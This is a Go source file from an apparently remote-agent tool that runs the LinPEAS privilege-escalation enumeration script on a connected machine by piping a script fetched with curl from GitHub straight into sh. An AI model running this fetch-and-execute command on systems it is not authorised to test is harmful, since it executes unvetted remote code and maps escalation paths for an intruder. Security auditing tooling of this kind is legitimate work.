package action

import (
	"fmt"
	"strings"

	"github.com/thecoderstudio/apollo-agent/logging"
	"github.com/thecoderstudio/apollo-agent/pty"
	"github.com/thecoderstudio/apollo-agent/websocket"
)

const initialisationIndication = "Green"
const completionIndication = "linPEAS done"
const commandFormat = "curl https://raw.githubusercontent.com/carlospolop/" +
	"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
	"linpeas.sh | sh && echo '%s\n'\n"

// LinPeas allows for the execution of LinPEAS. LinPEAS is a script
// to search for possible local privilege escalation paths
// https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
type LinPeas struct {
	ConnectionID string
	Session      *pty.Session
}

// Run runs LinPEAS on the machine
func (linPeas LinPeas) Run() *chan websocket.Command {
	result := make(chan websocket.Command)
	go linPeas.waitForCompletion(&result)
	go linPeas.Session.Execute(
		fmt.Sprintf(commandFormat, completionIndication),
	)
	return &result
}

func (linPeas LinPeas) waitForCompletion(result *chan websocket.Command) {
	out := make(chan interface{})
	broadcaster := *linPeas.Session.Out()
	broadcaster.Register(out)

	linPeas.waitForInitialisation(out)
	for {
		if linPeas.outputContains(out, completionIndication) {
			logging.Critical("DONEE")
			*result <- websocket.Command{
				ConnectionID: linPeas.ConnectionID,
				Command:      "finished",
			}
			broadcaster.Unregister(out)
		}
	}
}

func (linPeas LinPeas) waitForInitialisation(out chan interface{}) {
	for {
		if linPeas.outputContains(out, initialisationIndication) {
			logging.Critical("init")
			return
		}
	}
}

func (linPeas LinPeas) outputContains(out chan interface{}, substring string) bool {
	outputGeneric := <-out
	output := outputGeneric.(websocket.ShellIO)
	return strings.Contains(output.Message, substring)
}
